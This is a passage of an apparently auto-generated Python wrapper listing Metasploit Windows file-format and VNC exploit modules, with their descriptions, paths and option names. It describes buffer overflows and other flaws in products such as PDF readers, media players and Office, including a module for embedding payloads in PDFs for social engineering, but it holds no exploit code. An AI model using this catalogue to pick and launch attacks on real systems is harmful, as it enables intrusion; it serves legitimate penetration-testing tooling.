          triggered when opening a malformed PDF file that contains an overly long string in a /Launch field. This results in overwriting a structured exception handler record.
          This exploit does not use javascript.
      
		"""

		path = 'windows/fileformat/nuance_pdf_launch_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ms15_020_shortcut_icon_dllloader(object):
		"""
		
        This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling
        of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious
        DLL. This module creates the required files to exploit the vulnerability. They must be
        uploaded to an UNC path accessible by the target. This module has been tested successfully
        on Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027
        installed.
      
		"""

		path = 'windows/fileformat/ms15_020_shortcut_icon_dllloader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_UNCHOST = 'UNCHOST'
			required_UNCSHARE = 'UNCSHARE'

	class windows_fileformat_a_pdf_wav_to_mp3(object):
		"""
		
          This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When
        the application is used to import a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/a_pdf_wav_to_mp3'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_mediacoder_m3u(object):
		"""
		
          This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability
        occurs when adding an .m3u, allowing arbitrary code execution under the context
        of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder
        runs with DEP. This module has been tested successfully on MediaCoder 0.8.21.5539
        to 0.8.22.5530 over Windows XP SP3 and Windows 7 SP0.
      
		"""

		path = 'windows/fileformat/mediacoder_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_chasys_draw_ies_bmp_bof(object):
		"""
		
          This module exploits a buffer overflow vulnerability found in Chasys Draw IES
        (version 4.10.01). The vulnerability exists in the module flt_BMP.dll, while
        parsing BMP files, where the ReadFile function is used to store user provided data
        on the  stack in a insecure way. It results in arbitrary code execution under the
        context of the user viewing a specially crafted BMP file. This module has been
        tested successfully with Chasys Draw IES 4.10.01 on Windows XP SP3 and Windows 7
        SP1.
      
		"""

		path = 'windows/fileformat/chasys_draw_ies_bmp_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_gsm_sim(object):
		"""
		
          This module exploits a stack-based buffer overflow in GSM SIM Editor 5.15.
        When opening a specially crafted .sms file in GSM SIM Editor a stack-based buffer
        overflow occurs which allows an attacker to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/gsm_sim'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_xenorate_xpl_bof(object):
		"""
		
          This module exploits a stack buffer overflow in Xenorate 2.50
        by creating a specially crafted xpl file.
      
		"""

		path = 'windows/fileformat/xenorate_xpl_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_aol_phobos_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow within Phobos.dll of AOL 9.5.
        By setting an overly long value to 'Import()', an attacker can overrun a buffer
        and execute arbitrary code.

        NOTE: This ActiveX control is NOT marked safe for scripting or initialization.
      
		"""

		path = 'windows/fileformat/aol_phobos_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_acdsee_fotoslate_string(object):
		"""
		
          This module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via
        a specially crafted id parameter in a String element.  When viewing a malicious
        PLP file with the ACDSee FotoSlate product, a remote attacker could overflow a
        buffer and execute arbitrary code. This exploit has been tested on systems such as
        Windows XP SP3, Windows Vista, and Windows 7.
      
		"""

		path = 'windows/fileformat/acdsee_fotoslate_string'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_audio_coder_m3u(object):
		"""
		
          This module exploits a buffer overflow in AudioCoder 0.8.18. The vulnerability
        occurs when adding an .m3u, allowing arbitrary code execution with the privileges
        of the user running AudioCoder. This module has been tested successfully on
        AudioCoder 0.8.18.5353 over Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/audio_coder_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_wireshark_mpeg_overflow(object):
		"""
		
          This module triggers a stack buffer overflow in Wireshark <= 1.8.12/1.10.5
          by generating an malicious file.)
      
		"""

		path = 'windows/fileformat/wireshark_mpeg_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_videocharge_studio(object):
		"""
		
          This module exploits a stack based buffer overflow in VideoCharge Studio 2.12.3.685 when
          processing a specially crafted .VSC file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of VideoCharge Studio to open a malicious .VSC file.
      
		"""

		path = 'windows/fileformat/videocharge_studio'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_hhw_hhp_contentfile_bof(object):
		"""
		
          This module exploits a stack buffer overflow in HTML Help Workshop 4.74
          by creating a specially crafted hhp file.
      
		"""

		path = 'windows/fileformat/hhw_hhp_contentfile_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_deepburner_path(object):
		"""
		
          This module exploits a stack-based buffer overflow in versions 1.9.0.228,
        1.8.0, and possibly other versions of AstonSoft's DeepBurner (Pro, Lite, etc).
        An attacker must send the file to victim and the victim must open the file.
        Alternatively it may be possible to execute code remotely via an embedded
        DBR file within a browser, since the DBR extention is registered to DeepBurner.
      
		"""

		path = 'windows/fileformat/deepburner_path'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_apple_quicktime_texml(object):
		"""
		
          This module exploits a vulnerability found in Apple QuickTime. When handling
        a TeXML file, it is possible to trigger a stack-based buffer overflow, and then
        gain arbitrary code execution under the context of the user.  This is due to the
        QuickTime3GPP.gtx component not handling certain Style subfields properly, storing
        user-supplied data on the stack, which results the overflow.
      
		"""

		path = 'windows/fileformat/apple_quicktime_texml'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ms13_071_theme(object):
		"""
		
        This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows
        2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot]
        section. An arbitrary path can be used as screen saver, including a remote SMB resource,
        which allows for remote code execution when a malicious .theme file is opened, and the
        "Screen Saver" tab is viewed. The code execution is also triggered if the victim installs
        the malicious theme and stays away from the computer, when Windows tries to display the
        screensaver.
      
		"""

		path = 'windows/fileformat/ms13_071_theme'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'

	class windows_fileformat_visio_dxf_bof(object):
		"""
		
          This module exploits a stack based overflow vulnerability in the handling
        of the DXF files by Microsoft Visio 2002. Revisions prior to the release of
        the MS bulletin MS10-028 are vulnerable. The overflow occurs when the application
        is used to import a specially crafted DXF file, while parsing the HEADER section
        of the DXF file.

        To trigger the vulnerability an attacker must convince someone to insert a
        specially crafted DXF file to a new document, go to 'Insert' -> 'CAD Drawing'
        
		"""

		path = 'windows/fileformat/visio_dxf_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_shadow_stream_recorder_bof(object):
		"""
		
        This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7.
        Using the application to open a specially crafted asx file, a buffer
        overflow may occur to allow arbitrary code execution under the context
        of the user.
      
		"""

		path = 'windows/fileformat/shadow_stream_recorder_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_etrust_pestscan(object):
		"""
		
        This module exploits a stack buffer overflow in CA eTrust PestPatrol. When
        sending an overly long string to the Initialize() property of ppctl.dll (5.6.7.9)
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/etrust_pestscan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ms10_087_rtf_pfragments_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow in the handling of the
        'pFragments' shape property within the Microsoft Word RTF parser. All versions
        of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the
        MS10-087 bulletin are vulnerable.

        This module does not attempt to exploit the vulnerability via Microsoft Outlook.

        The Microsoft Word RTF parser was only used by default in versions of Microsoft
        Word itself prior to Office 2007. With the release of Office 2007, Microsoft
        began using the Word RTF parser, by default, to handle rich-text messages within
        Outlook as well. It was possible to configure Outlook 2003 and earlier to use
        the Microsoft Word engine too, but it was not a default setting.

        It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that
        Microsoft will confirm or deny this since Office 2000 has reached its support
        cycle end-of-life.
      
		"""

		path = 'windows/fileformat/ms10_087_rtf_pfragments_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_free_mp3_ripper_wav(object):
		"""
		
          This module exploits a stack based buffer overflow found in Free MP3 CD
        Ripper 1.1.  The overflow is triggered when an unsuspecting user opens a malicious
        WAV file.
      
		"""

		path = 'windows/fileformat/free_mp3_ripper_wav'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_feeddemon_opml(object):
		"""
		
          This module exploits a buffer overflow in FeedDemon v3.1.0.12. When the application
        is used to import a specially crafted opml file, a buffer overflow occurs allowing
        arbitrary code execution.

        All versions are suspected to be vulnerable. This vulnerability was originally reported
        against version 2.7 in February of 2009.
      
		"""

		path = 'windows/fileformat/feeddemon_opml'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_fdm_torrent(object):
		"""
		
          This module exploits a stack buffer overflow in Free Download Manager
        3.0 Build 844. Arbitrary code execution could occur when parsing a
        specially crafted torrent file.
      
		"""

		path = 'windows/fileformat/fdm_torrent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_proshow_load_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow in Photodex ProShow Producer
        v5.0.3256 in the handling of the plugins load list file. An attacker must send the
        crafted "load" file to victim, who must store it in the installation directory. The
        vulnerability will be triggered the next time ProShow is opened. The module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/proshow_load_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_coolpdf_image_stream_bof(object):
		"""
		
          This module exploits a stack buffer overflow in Cool PDF Reader prior to version
        3.0.2.256. The vulnerability is triggered when opening a malformed PDF file that
        contains a specially crafted image stream. This module has been tested successfully
        on Cool PDF 3.0.2.256 over Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/coolpdf_image_stream_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			required_PDF_Obfuscate = 'PDF::Obfuscate'
			required_PDF_Method = 'PDF::Method'
			required_PDF_Encoder = 'PDF::Encoder'
			required_PDF_MultiFilter = 'PDF::MultiFilter'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_foxit_title_bof(object):
		"""
		
          This module exploits a stack buffer overflow in Foxit PDF Reader prior to version
        4.2.0.0928. The vulnerability is triggered when opening a malformed PDF file that
        contains an overly long string in the Title field. This results in overwriting a
        structured exception handler record.

        NOTE: This exploit does not use javascript.
      
		"""

		path = 'windows/fileformat/foxit_title_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			required_PDF_Obfuscate = 'PDF::Obfuscate'
			required_PDF_Method = 'PDF::Method'
			required_PDF_Encoder = 'PDF::Encoder'
			required_PDF_MultiFilter = 'PDF::MultiFilter'

	class windows_fileformat_actfax_import_users_bof(object):
		"""
		
          This module exploits a vulnerability in ActiveFax Server. The vulnerability is
        a stack based buffer overflow in the "Import Users from File" function, due to the
        insecure usage of strcpy while parsing the csv formatted file. The module creates a
        .exp file that must be imported with ActiveFax Server. It must be imported with the
        default character set 'ECMA-94 / Latin 1 (ISO 8859)'. The module has been tested
        successfully on ActFax Server 4.32 over Windows XP SP3 and Windows 7 SP1. In the
        Windows XP case, when ActFax runs as a service, it will execute as SYSTEM.
      
		"""

		path = 'windows/fileformat/actfax_import_users_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_homm3_h3m(object):
		"""
		
          This module embeds an exploit into an ucompressed map file (.h3m) for
        Heroes of Might and Magic III. Once the map is started in-game, a
        buffer overflow occuring when loading object sprite names leads to
        shellcode execution.
      
		"""

		path = 'windows/fileformat/homm3_h3m'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_mplayer_sami_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow found in the handling
        of SAMI subtitles files in MPlayer SVN Versions before 33471. It currently
        targets SMPlayer 0.6.8, which is distributed with a vulnerable version of mplayer.

        The overflow is triggered when an unsuspecting victim opens a movie file first,
        followed by loading the malicious SAMI subtitles file from the GUI. Or, it can also
        be done from the console with the mplayer "-sub" option.
      
		"""

		path = 'windows/fileformat/mplayer_sami_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ultraiso_cue(object):
		"""
		
          This module exploits a stack-based buffer overflow in EZB Systems, Inc's
        UltraISO. When processing .CUE files, data is read from file into a
        fixed-size stack buffer. Since no bounds checking is done, a buffer overflow
        can occur. Attackers can execute arbitrary code by convincing their victim
        to open an CUE file.

        NOTE: A file with the same base name, but the extension of "bin" must also
        exist. Opening either file will trigger the vulnerability, but the files must
        both exist.
      
		"""

		path = 'windows/fileformat/ultraiso_cue'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_pdf_embedded_exe(object):
		"""
		
          This module embeds a Metasploit payload into an existing PDF file. The
        resulting PDF can be sent to a target as part of a social engineering attack.
      
		"""

		path = 'windows/fileformat/adobe_pdf_embedded_exe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_INFILENAME = 'INFILENAME'
			EXENAME = 'EXENAME'
			LAUNCH_MESSAGE = 'LAUNCH_MESSAGE'

	class windows_fileformat_xradio_xrl_sehbof(object):
		"""
		
        This module exploits a buffer overflow in xRadio 0.95b.
        Using the application to import a specially crafted xrl file,
        a buffer overflow occurs allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/xradio_xrl_sehbof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_adobe_toolbutton(object):
		"""
		
        This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6
        and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where
        the cEnable callback can be used to early free the object memory. Later use of the object
        allows triggering the use after free condition. This module has been tested successfully
        on Adobe Reader 11.0.2, 10.0.4 and 9.5.0 on Windows XP SP3, as exploited in the wild in
        November, 2013.
      
		"""

		path = 'windows/fileformat/adobe_toolbutton'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_audiotran_pls(object):
		"""
		
          This module exploits a stack-based buffer overflow in Audiotran 1.4.1.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively it may be possible to execute code remotely via an embedded
        PLS file within a browser, when the PLS extention is registered to Audiotran.
        This functionality has not been tested in this module.
      
		"""

		path = 'windows/fileformat/audiotran_pls'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ms09_067_excel_featheader(object):
		"""
		
            This module exploits a vulnerability in the handling of the FEATHEADER record
          by Microsoft Excel. Revisions of Office XP and later prior to the release of the
          MS09-067 bulletin are vulnerable.

          When processing a FEATHEADER (Shared Feature) record, Microsoft used a data
          structure from the file to calculate a pointer offset without doing proper
          validation. Attacker supplied data is then used to calculate the location of an
          object, and in turn a virtual function call. This results in arbitrary code
          exection.

          NOTE: On some versions of Office, the user will need to dismiss a warning dialog
          prior to the payload executing.
        
		"""

		path = 'windows/fileformat/ms09_067_excel_featheader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			required_OUTPUTPATH = 'OUTPUTPATH'

	class windows_fileformat_abbs_amp_lst(object):
		"""
		
          This module exploits a buffer overflow in ABBS Audio Media Player. The vulnerability
        occurs when adding a specially crafted .lst file, allowing arbitrary code execution with the privileges
        of the user running the application . This module has been tested successfully on
        ABBS Audio Media Player 3.1 over Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/abbs_amp_lst'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_acdsee_xpm(object):
		"""
		
          This module exploits a buffer overflow in ACDSee 9.0.
        When viewing a malicious XPM file with the ACDSee product,
        a remote attacker could overflow a buffer and execute
        arbitrary code.
      
		"""

		path = 'windows/fileformat/acdsee_xpm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ht_mp3player_ht3_bof(object):
		"""
		
          This module exploits a stack buffer overflow in HT-MP3Player 1.0.
          Arbitrary code execution could occur when parsing a specially crafted
          .HT3 file.

          NOTE: The player installation does not register the file type to be
          handled. Therefore, a user must take extra steps to load this file.
      
		"""

		path = 'windows/fileformat/ht_mp3player_ht3_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_vnc_realvnc_client(object):
		"""
		
        This module exploits a buffer overflow in RealVNC 3.3.7 (vncviewer.exe).
      
		"""

		path = 'windows/vnc/realvnc_client'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_vnc_ultravnc_client(object):
		"""
